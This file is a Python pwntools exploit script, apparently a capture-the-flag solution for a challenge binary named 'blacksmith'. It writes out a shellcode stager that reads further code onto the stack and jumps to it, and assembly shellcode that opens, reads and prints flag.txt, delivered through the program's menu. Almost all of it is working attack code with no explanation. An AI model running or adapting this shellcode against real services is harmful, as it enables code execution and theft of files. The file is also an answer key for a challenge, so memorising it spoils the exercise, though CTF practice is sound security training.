#!/usr/bin/env python3


from pwn import *

BINARY = "./blacksmith"
ADDR = "localhost"
PORT = 4444

splash()
elf = context.binary = ELF(BINARY)

STAGER = """
        /* call read(0, rsp, 0xfff) */
        xor rdi, rdi
        sub rsp, 0xfff
        lea rsi, [rsp]
        mov rdx, 0xfff
        xor rax, rax
        syscall
        jmp rsp
"""
SHELLCODE = """
        /* push b'flag.txt\x00' */
        xor rbx, rbx
        push rbx
        mov rax, 0x7478742e67616c66
        push rax
        /* call open('rsp', 'O_RDONLY', 0) */
        mov rax, 2
        mov rdi, rsp
        xor rsi, rsi /* O_RDONLY */
        cdq /* rdx=0 */
        syscall
        /* call read(3, rsp, 0xfff) */
		mov rdi, rax
        sub rsp, 0xfff
		lea rsi, [rsp]
		mov rdx, 0xfff
		xor rax, rax
		syscall
        /* call write(1, rsp, bytes_read) */
        mov rdx, rax
        mov rdi, 1
        mov rax, 1
        syscall
        /* call exit(0) */
        mov rax, 60
        mov rdi, 0
        syscall
"""


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    else:
        return remote(ADDR, PORT)


def solve() -> None:
    io = conn()

    io.sendlineafter("> ", "1")
    io.sendlineafter("> ", "2")
    io.sendlineafter("> ", asm(STAGER))
    io.send((b"\x90" * 0x30) + asm(SHELLCODE))

    io.interactive()


if __name__ == "__main__":
    solve()
